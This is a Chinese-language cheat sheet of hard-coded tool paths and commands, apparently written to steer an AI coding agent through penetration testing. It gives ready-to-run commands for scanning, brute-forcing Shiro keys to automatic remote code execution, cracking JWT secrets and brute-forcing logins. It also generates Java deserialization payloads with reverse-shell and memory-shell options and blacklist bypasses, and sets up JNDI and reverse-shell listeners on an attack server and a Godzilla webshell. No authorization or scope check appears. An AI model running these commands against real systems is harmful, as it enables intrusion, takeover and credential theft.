# 工具链固定路径总表 — 用到即抄，永不"找工具"

**原则**: 所有工具/字典/脚本路径写死，调用即用。找不到工具 = 流程错误，不是目标的问题。

## 主动探测（S1）
| 动作 | 命令 | 字典 |
|------|------|------|
| Java 三件套 | `dnslog.py fire --type log4j|fastjson --target <url>` + Shiro 探针 `rememberMe=test` | — |
| 目录扫描 | `python tools/dirsearch-0.4.3/dirsearch.py -u <url> -w tools/dirsearch-0.4.3/db/dicc.txt -e php,jsp,asp,json -t 20 --exclude-status 404` | dirsearch-0.4.3/db/dicc.txt |
| 存活探测 | `tools/httpx/httpx.exe` | `httpx -l urls.txt -title -status-code -tech-detect -o alive.txt` | — |
| JS 分析提取 | `tools/js_api_extract.py` | `python tools/js_api_extract.py <url> --out api.txt`（SPA 补 Blueprint evaluate） | — |
| 指纹 | `tools/FingerScan/FingerScan-v3.0.11.jar`（**Burp 插件**非CLI: Extensions→Add） | 见 `recon.md` |

## 漏洞利用（S3）
| 攻击链 | 工具固定路径 | 命令 | 字典 |
|--------|-------------|------|------|
| **SQLi** | `tools/sqlmap-1.8/sqlmap.py` | 完整链见 `sqli.md`（确认→dbms→tamper→dump） | — |
| **SSRF** | `tools/SSRFmap/ssrfmap.py` | 完整链见 `ssrf.md`（抓包→读文件/端口/元数据） | — |
| **Shiro** | `tools/shiro/shiro_pyke/shirokit.py` | `python shirokit.py scan <url>`（爆破1106 key→自动RCE→JSON）；`exec <url> <key> CommonsBeanutils1_183 AllEcho "whoami"`；`rce <url> <key>`（15链×3回显）；`scan targets.txt rememberMe 20 4` 批量 | 内置1106 key(SPC无假阳性)+15链 |
| **Fastjson** | `tools/fastjson_exp/cti2026_scanner/fjscan_probe.py` | `cd tools/fastjson_exp/cti2026_scanner && python fjscan_probe.py --auto --collaborator <域> --targets 目标.txt` | — |
| **Log4j** | `tools/dnslog_helper/dnslog.py` | `python dnslog.py fire --type log4j --target <url>` | — |
| **JWT 弱密钥** | `tools/jwt_tool/jwt_tool.py` | `python tools/jwt_tool/jwt_tool.py <JWT> -C -d tools/jwt_tool/jwt-secrets-full.txt` | jwt_tool/jwt-secrets-full.txt |
| **弱口令爆破** | 手工/Burp Intruder | 登录接口打字典 | `dicts/10k-most-common.txt`(1万) + `dicts/variants.txt`(3758) |
| **中间件 RCE** | `knowledge_base/srcwiki_poc/` + GSL5/JYso/JNDIExploit/redis-rogue-server | 见 `midware-rce.md` | — |
| **Nacos** | 未授权读用户→默认口令→CVE-2021-29441→配置凭据→Redis直连 | 见 `midware-nacos.md` | — |
| **javachain 链平台** | `tools/javachain/jchain.py` 一键生成（<your-attack-server>:8011, <your-javachain-credentials>） | `python jchain.py native -c CB1 --exec "whoami"` / `shiro -k <key> --exec` / `hessian` / `xstream` / `fastjson --jndi` / `jdbc-h2` / `xmldec` / `--tomcat-echo` / `--reverse-shell` / `--memshell`；`list`/`params`/`raw` | 30 payload×64链×50内置RCE（含BeanShell/Groovy/Rome黑名单绕过）；用法见 README.md |

## OOB / 外带（D 类）
| 工具 | 路径 | 用法 |
|------|------|------|
| DNSLog | `tools/dnslog_helper/dnslog.py` | get / probe --type / fire --type / watch / poll |
| JNDI 服务 | `tools/attack_infra/srv.py jndi` | LDAP:1389 + HTTP:8080（<your-attack-server>） |
| HTTP 回连 | `tools/attack_infra/srv.py http` | 8811 |
| 反弹监听 | `tools/attack_infra/srv.py listen <port>` | tmux，`attach <port>` 交互 |

## 后渗透
| 工具 | 路径 | 用法 |
|------|------|------|
| GSL5 WebShell | `tools/GodzillaSuper/bin/gsl5.jar` | `cd tools/GodzillaSuper && java -jar bin\gsl5.jar mcp 9123 127.0.0.1` |
| TscanPlus | `D:\Desktop\TscanPlus_Win_Amd64.exe` | 直接调用 |
| JADX | `D:\Download\jadx\jadx-gui-1.5.5.exe` | 直接调用 |

## 找不到工具时
按 CLAUDE.md「工具搜索路径优先级」：先 `D:\Desktop\Claude\tools\` → 再 `D:\Desktop\One_Fox\` 递归搜。以上路径写死，不该走到这步。
